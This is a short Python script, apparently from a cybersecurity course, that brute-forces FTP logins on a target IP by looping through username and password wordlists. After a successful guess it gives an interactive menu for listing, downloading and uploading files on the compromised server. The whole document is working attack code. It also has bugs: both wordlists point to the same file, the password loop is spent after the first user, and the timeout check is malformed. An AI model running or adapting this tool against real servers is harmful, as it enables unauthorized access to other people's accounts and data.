import ftplib

auth= False

try:
    target= input("Enter IP: ")
    server= ftplib.FTP()
    
    users= open(r"C:\FILES\Cyber\Phase3\Python\userlist.txt")
    passwords= open(r"C:\FILES\Cyber\Phase3\Python\userlist.txt")

    for u in users:
        try:
            u= u.replace("\n","")
            for p in passwords:
                p = p.replace("\n","")
                server.connect(target,21)
                server.login(u,p)

                print(f"Connected with {u} and {p}")

                auth= True

                while auth:

                    if auth:
                        print("1. List Files")
                        print("2. Download Files")
                        print("3. Upload Files")
                        print("4. Exit")

                        choice= int(input("What do you want to do? "))

                        if choice==1:
                            server.dir()

                        if choice==2:
                            filenamedown=input("Enter the file name to download from server: ")
                            filenamedown1= input("Enter the path to save the file: ")
                            final= filenamedown1 + filenamedown
                            with open(final, "wb") as file:
                            # use FTP's RETR command to download the file
                                server.retrbinary(f"RETR {filenamedown}", file.write)

                        if choice==3:
                            filename=input("Enter complete file path: ")
                            filenameStored= input("Enter the name to be stored: ")
                            with open(filename, "rb") as file:
                                # use FTP's STOR command to upload the file
                                server.storbinary(f"STOR {filenameStored}", file)
                    
                        if choice==4:
                            auth= False
                            server.quit()
                            print("Bye!")
                            break

        except Exception as error:
            if "timed out" in {error}:
                print("Invalid")
    
except Exception as error:
    print(error)